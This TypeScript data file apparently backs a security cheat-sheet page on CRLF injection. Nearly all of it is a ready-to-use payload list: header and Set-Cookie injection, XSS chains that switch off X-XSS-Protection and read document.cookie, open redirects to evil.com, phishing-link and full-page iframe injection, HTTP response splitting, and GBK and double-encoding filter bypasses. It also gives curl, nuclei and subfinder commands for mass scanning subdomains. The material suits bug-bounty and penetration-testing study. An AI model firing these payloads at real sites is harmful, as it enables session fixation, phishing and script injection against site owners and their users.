export interface CRLFCategory {
  category: string
  commands: { command: string; description: string }[]
}

export const lastUpdated = "2026-05-28"
export const pageDescription = "CRLF injection — HTTP header manipulation, response splitting, XSS, GBK bypass, and detection techniques."

export const crlfCategories: CRLFCategory[] = [
  {
    category: "What is CRLF Injection?",
    commands: [
      {
        command: "CRLF Injection occurs when an attacker injects CR (%0d) and LF (%0a) characters into HTTP headers or responses",
        description: "CRLF injection leads to HTTP response splitting, web cache poisoning, XSS, session fixation",
      },
      {
        command: "%0d%0aX-Injection-Test: injected",
        description: "Basic CRLF header injection payload",
      },
    ],
  },
  {
    category: "Real-World Payload Examples",
    commands: [
      {
        command: "%0d%0aX-Injection-Test: injected",
        description: "Inject a custom HTTP header",
      },
      {
        command: "%0d%0aSet-Cookie: hacked=true;",
        description: "Inject a malicious cookie",
      },
      {
        command: "%0d%0a%3Ch1%3EHTML%20INJECTION%3C%2Fh1%3E%0A%3Cp%3ECRLF%20Injection%20PoC%3C%2Fh1%3E",
        description: "HTML injection via CRLF",
      },
      {
        command: "%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A",
        description: "Phishing link injection",
      },
      {
        command: "%0d%0a%0d%0a%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29%3E",
        description: "XSS via img onerror",
      },
      {
        command: "%0d%0aLocation:%20https://evil.com",
        description: "Open redirect via CRLF",
      },
      {
        command: "%0d%0a%0d%0a<script>alert('XSS via CRLF')</script>",
        description: "XSS via CRLF injection",
      },
      {
        command: "%0d%0a%0d%0a%3Cscript%3Edocument.location.href%3D%22https%3A%2F%2Fevil.com%22%3C%2Fscript%3E",
        description: "JavaScript redirect via CRLF",
      },
      {
        command: "%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.cookie%29%3C/script%3E",
        description: "Disable XSS protection and inject script",
      },
      {
        command: "%0d%0a%0d%0a%3Ciframe%20src%3D%22https%3A%2F%2Fwww.nasa.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E%0A",
        description: "Hidden iframe injection",
      },
    ],
  },
  {
    category: "HTTP Response Splitting",
    commands: [
      {
        command: "/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Split!')</script>",
        description: "HTTP response splitting payload",
      },
    ],
  },
  {
    category: "GBK Encoding Bypass",
    commands: [
      {
        command: "/%0D%0ASet-Cookie:whoami=coffinxp",
        description: "Basic CRLF payload (often blocked)",
      },
      {
        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=coffinxp",
        description: "GBK-encoded CRLF bypass payload",
      },
      {
        command: "https://example.com/%E5%98%8D%E5%98%8ASet-Cookie:whoami=coffinxp%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1);%E5%98%BC/script%E5%98%BE",
        description: "Full CRLF to XSS via GBK encoding",
      },
    ],
  },
  {
    category: "How to Hunt for CRLF Injection",
    commands: [
      {
        command: 'curl -I "https://example.com/%0d%0aSet-Cookie:crlf=injected;"',
        description: "Test CRLF injection with cURL",
      },
      {
        command: "nuclei -u https://target.com -t cRlf.yaml",
        description: "Scan a single URL for CRLF",
      },
      {
        command: "subfinder -d domain.com -all | nuclei -t cRlf.yaml",
        description: "Mass CRLF scan across subdomains",
      },
    ],
  },
  {
    category: "Complete Payload List",
    commands: [
      {
        command: "/%%0a0aSet-Cookie:coffin=hi",
        description: "Double-encoded CRLF payload",
      },
      {
        command: "/%0aSet-Cookie:coffin=hi;",
        description: "LF-only cookie injection",
      },
      {
        command: "/%0d%0aLocation: http://evil.com",
        description: "CRLF open redirect",
      },
      {
        command: "/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
        description: "Response splitting with XSS protection bypass",
      },
      {
        command: "/%0d%0a%0d%0a<script>alert('XSS')</script>;",
        description: "XSS via CRLF injection",
      },
      {
        command: "/%0d%0aLocation: www.evil.com",
        description: "Location header injection",
      },
      {
        command: "/%0d%0aSet-Cookie:coffin=hi;",
        description: "Set-Cookie header injection",
      },
      {
        command: "/%23%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<svg/onload=alert(document.domain)>",
        description: "XSS bypass via fragment + CRLF",
      },
      {
        command: "/%25%30%61Set-Cookie:coffin=hi",
        description: "Double-encoded LF cookie injection",
      },
      {
        command: "/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi",
        description: "Path traversal + CRLF injection",
      },
      {
        command: "/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(document.domain)</script>",
        description: "Full XSS chain via query param CRLF",
      },
      {
        command: "/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;",
        description: "GBK + CRLF cookie injection",
      },
      {
        command: "/%E5%98%8D%E5%98%8ALocation:www.evil.com",
        description: "GBK-encoded redirect",
      },
      {
        command: "/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi",
        description: "GBK-encoded Set-Cookie injection",
      },
      {
        command: "/%u000ASet-Cookie:coffin=hi;",
        description: "Unicode LF cookie injection",
      },
    ],
  },
]
